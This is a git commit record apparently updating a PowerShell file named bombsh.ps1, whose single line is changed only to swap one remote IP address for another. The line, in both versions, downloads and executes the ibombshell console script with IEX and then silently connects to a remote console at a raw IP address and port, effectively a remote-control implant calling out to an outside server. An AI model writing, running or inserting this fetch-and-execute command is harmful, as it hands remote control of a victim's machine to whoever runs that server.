6fc725ced76eeed9bca410f236393d0b7a173529
userdol <48455401+userdol@users.noreply.github.com>
2019-03-28 02:32:47 +0300

    Update bombsh.ps1

--- bombsh.ps1
+++ bombsh.ps1
@@ -1,1 +1,1 @@
-IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/console'); console -Silently -uriConsole 163.172.144.82:8080
+IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/ElevenPaths/ibombshell/master/console'); console -Silently -uriConsole 23.106.160.239:8080
